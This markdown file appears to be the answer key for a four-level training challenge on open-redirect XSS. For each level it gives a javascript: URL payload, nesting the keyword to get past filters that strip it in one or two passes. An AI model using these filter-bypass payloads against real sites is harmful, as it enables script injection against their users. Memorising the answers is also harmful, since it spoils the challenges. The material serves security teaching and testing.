# redirect — solutions

Open-redirect endpoints where the `query` param feeds `env.redirect`; XSS via `javascript:` URL when followed in a browser context.

### redirect-level1

`/redirect/level1/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: unfiltered redirect target

### redirect-level2

`/redirect/level2/?query=javajavascriptscript:alert(1)`

- payload: `javajavascriptscript:alert(1)`
- context: single-pass `javascript` strip; nest to reassemble

### redirect-level3

`/redirect/level3/?query=javajavascriptscript:alert(1)`

- payload: `javajavascriptscript:alert(1)`
- context: downcase + single-pass `javascript` strip; nest reassembles

### redirect-level4

`/redirect/level4/?query=javajavajavascriptscriptscript:alert(1)`

- payload: `javajavajavascriptscriptscript:alert(1)`
- context: two passes of `javascript` strip; triple-nest to survive both
